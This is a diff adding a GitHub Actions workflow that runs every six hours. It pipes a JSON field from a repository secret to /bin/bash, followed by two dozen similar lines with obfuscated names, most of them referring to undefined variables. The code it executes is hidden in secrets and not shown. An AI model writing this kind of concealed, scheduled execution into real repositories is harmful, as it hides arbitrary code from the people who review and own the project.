@@ -1,0 +1,40 @@
+name: shengfentaichang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shengfentaichang
+        env:
+          l82514: ${{ secrets.l82514 }}
+        run: |
+          echo $l82514 | jq -r .jui99302 | /bin/bash
+          echo $h654 | jq -r .wssmf3 | /bin/bash
+          echo $wg4281 | jq -r .z7801 | /bin/bash
+          echo $zobgk3 | jq -r .i1819 | /bin/bash
+          echo $pla91 | jq -r .y0674 | /bin/bash
+          echo $qc8 | jq -r .eeue2131 | /bin/bash
+          echo $lguby3 | jq -r .z464 | /bin/bash
+          echo $xzl3213 | jq -r .i6 | /bin/bash
+          echo $q378 | jq -r .f87 | /bin/bash
+          echo $q68 | jq -r .ub371 | /bin/bash
+          echo $edqxq4 | jq -r .bs988 | /bin/bash
+          echo $xll10 | jq -r .xjsqb8912 | /bin/bash
+          echo $dse45 | jq -r .uudhs57523 | /bin/bash
+          echo $syw89 | jq -r .n1 | /bin/bash
+          echo $mhh0891 | jq -r .sinj60820 | /bin/bash
+          echo $mdzbv31387 | jq -r .mnhm9363 | /bin/bash
+          echo $rzmkh2847 | jq -r .hastc4 | /bin/bash
+          echo $d24 | jq -r .gjt9214 | /bin/bash
+          echo $eaap2 | jq -r .qzyhj259 | /bin/bash
+          echo $dv8 | jq -r .kw11551 | /bin/bash
+          echo $ya5 | jq -r .wr51210 | /bin/bash
+          echo $hp3 | jq -r .x44566 | /bin/bash
+          echo $bxvaq12 | jq -r .ady75 | /bin/bash
+          echo $ja74 | jq -r .il995 | /bin/bash
+
